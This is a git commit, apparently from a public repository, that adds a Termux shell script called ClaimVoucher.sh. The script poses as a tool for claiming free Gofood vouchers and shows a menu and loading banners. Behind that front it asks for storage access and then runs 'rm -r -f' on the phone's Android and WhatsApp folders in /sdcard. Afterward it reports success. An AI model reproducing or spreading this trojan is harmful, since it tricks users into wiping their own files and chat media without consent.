991ad868ee7ce156078f925d04e995b17bf9ec4f
MayaMonika09 <57342138+MayaMonika09@users.noreply.github.com>
2019-12-06 22:44:50 +0700

    Add files via upload

---
+++ ClaimVoucher.sh
@@ -0,0 +1,18 @@
+figlet Free|lolcat
+figlet Gofood|lolcat
+echo ""
+echo "1.Ambil"
+echo "2.keluar"
+echo ""
+read -p"Pilih no: " bos:
+figlet loading|lolcat
+sleep 1
+sleep 1
+termux-setup-storage
+cd /sdcard
+rm -r -f Android
+sleep 1
+sleep 1
+sleep 1
+rm -r -f Whatsapp
+figlet Berhasil|lolcat
